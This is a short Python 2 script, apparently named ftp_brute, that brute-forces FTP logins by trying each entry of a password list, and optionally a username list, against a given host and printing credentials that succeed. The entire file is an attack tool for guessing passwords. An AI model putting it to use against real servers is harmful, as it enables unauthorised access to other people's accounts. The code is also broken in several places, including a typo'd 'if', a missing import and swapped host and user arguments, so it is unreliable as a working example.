import ftplib
from threading import  *
import optparse

def connect(hostname, user, password, verbose):
	try:
		
		f verbose:
			print '[*] Trying %s:%s'%(user, password)
		password = password.strip('\n')
		ftp = ftplib.FTP(hostname)
		ftp.login(user, password)
		print '[*] Found Password : %s/%s'%(user,password)
		Found = True
	except Exception, e:
		pass


def main():
	parser = optparse.OptionParser('Usage: ftp_brute -u <username> -H host -P <passwordlist>')
	parser.add_option('-u', dest='User', type='string', help='---')
	parser.add_option('-P', dest='Passwords', type='string', help='---')
	parser.add_option('-H', dest='Host', type='string', help='---')
	parser.add_option('-U', dest='Users', type='string', help='---')
	parser.add_option('-v', dest='verbose', type='string', help='---')
	(options, args) = parser.parse_args()
	
	User = options.User
	Users = options.Users
	Host = options.Host
	Passwords = options.Passwords
	verbose = options.verbose

	if (User == None & Users == None) | (Host == None) | (Passwords == None):
		print parser.usage
		exit
	
	if not os.path.isfile(Passwords):
		print '[-] %s Does\'nt Exist.'%Passwords
		exit(0)
	
	Passwords = open(Passwords, 'r')
	if Users != None:
		if not os.path.isfile(Users):
			print '[-] %s Does\'nt Exist.'%Users
			exit(0)
		else:
			f = open(Users, 'r')
			for User in f.readlines():
				for Pass in Passwords.readlines():
					connect(User, Host, Pass.strip('\n'), verbose)
	else:
		for Pass in Passwords.readlines():
			connect(User, Host,Pass.strip('\n'), verbose)


if __name__ == '__main__':
	main()
